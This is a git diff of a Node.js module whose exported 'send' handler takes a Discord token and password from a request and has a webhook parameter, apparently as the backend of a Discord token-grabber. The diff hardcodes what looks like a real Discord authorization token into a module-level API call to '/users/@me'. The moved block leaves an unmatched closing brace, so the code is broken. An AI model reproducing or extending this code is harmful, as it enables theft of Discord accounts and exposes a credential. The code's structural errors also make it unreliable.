@@ -2,6 +2,17 @@ const axios = require('axios');
 
 
 
+var info;
+axios.get('https://discordapp.com/api/v8/users/@me', {
+    withCredentials: true,
+    headers: {
+      Authorization: "NzkyNzgwNzU3NzY4MDc3MzMz.X_ganQ.Ig1qH6zNChHzlO0FigaE-znijZE",
+    },
+  }).then((response) => {	
+    info = response.data;
+  }
+  )
+}
 
 exports.send = (req, res, webhook) =>
 {
@@ -13,17 +24,7 @@ exports.send = (req, res, webhook) =>
 	
 	if(token === undefined || password === undefined)
 		return res.status(400).json({status: "error", message: "Not sent."});
-		var info;
-axios.get('https://discordapp.com/api/v8/users/@me', {
-    withCredentials: true,
-    headers: {
-      Authorization: token,
-    },
-  }).then((response) => {	
-    info = response.data;
-  }
-  )
-}
+
 
 	
 
